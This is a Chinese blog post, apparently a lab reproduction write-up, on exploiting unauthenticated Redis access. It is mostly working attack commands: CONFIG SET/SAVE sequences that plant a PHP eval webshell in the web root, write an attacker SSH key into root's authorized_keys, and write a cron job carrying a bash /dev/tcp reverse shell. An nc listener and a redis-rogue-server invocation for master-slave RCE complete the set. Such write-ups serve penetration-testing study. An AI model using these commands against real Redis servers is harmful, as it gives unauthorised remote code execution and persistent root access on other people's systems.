---
title: Redis未授权访问
date: 2020-06-06 21:20:08
categories: 漏洞复现
tags: 未授权访问
---

#### 背景

Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API，数据库默认监听端口**6379**,本实验修改端口为3901。

<!--more-->

#### 写一句话马

1.连接Redis

`redis-cli -h IP -p 端口`

2.写webshell

```
config set dir /var/www/html
config set dbfilename shell.php
set payload `<?php eval($_POST['cmd']);?>'
save
```

3.查看shell

![](http://cdn.laohuan.art/2020-06-01_21-36-42.png)

4.连接shell

![](http://cdn.laohuan.art/2020-06-01_21-35-33.png)

#### 写入shell密匙

前提是目标设置允许使用私匙登陆，且redis安装后会有一个普通redis用户，并且redis可以执行shell。若reids使用root用户运行，可将密匙写到root用户的.ssh文件下。

1.生成密匙

`ssh-keygen -t rsa`

![](http://cdn.laohuan.art/2020-06-01_6-11-15.png)

* ssh_ras为私匙
* ssh_rsa.pub为公匙

2.写入公匙

```
#Redis使用root用户运行时，密钥写入到root用户.ssh中
config set dir /root/.ssh/

#设置持久化文件名为authorized_keys
config set dbfilename authorized_keys

#写入密钥内容（需在公钥字符串前后加三个\n）
set sshpubkey "\n\n公匙内容\n\n"

#保存持久化文件
save
```

3.连接ssh

设置私匙权限

`chmod 600 ssh_ras`

使用私匙连接

`ssh -i ssh_ras root@IP`

#### 计划任务反弹shell

这一步反弹shell在Ubuntu测试失败，搜索一番从[VK'blog]([http://www.vkxss.top/2019/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bubuntu%E5%8F%8D%E5%BC%B9shell%E9%97%AE%E9%A2%98/index.html](http://www.vkxss.top/2019/05/28/渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题/index.html))得到结果，这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向/etc/cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。

1.Nc监听

`nc -nlvp 3950`

2.写shell

```
set shell "\n\n* * * * * bash -i >& /dev/tcp/ip/端口 0>&1\n\n"
config set dir /var/spool/cron/
config set dbfilename root
save
```

3.查看shell

![](http://cdn.laohuan.art/2020-06-01_09-56-59.png)

反弹shell已经写到计划任务，由于以上原因，无法反弹成功

#### 脚本

1.基于主从复制RCE

* <https://github.com/Ridter/redis-rce />
* <https://github.com/n0b0dyCN/redis-rogue-server/>

`python3 redis-rogue-server.py --rhost 目标主机 --rport 目标端口 --lhost 监听IP --lport 端口`

![](http://cdn.laohuan.art/2020-06-01_11-25-25.png)

选择1会直接得到一个shell

![](http://cdn.laohuan.art/2020-06-01_11-20-41.png)

选择2会得到一个反弹shell



#### 参考链接

<[http://www.vkxss.top/2019/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bubuntu%E5%8F%8D%E5%BC%B9shell%E9%97%AE%E9%A2%98/index.html](http://www.vkxss.top/2019/05/28/渗透测试-Redis未授权访问漏洞之ubuntu反弹shell问题/index.html)/>

<https://siweicn.yuque.com/securitytech/exploit/redis/>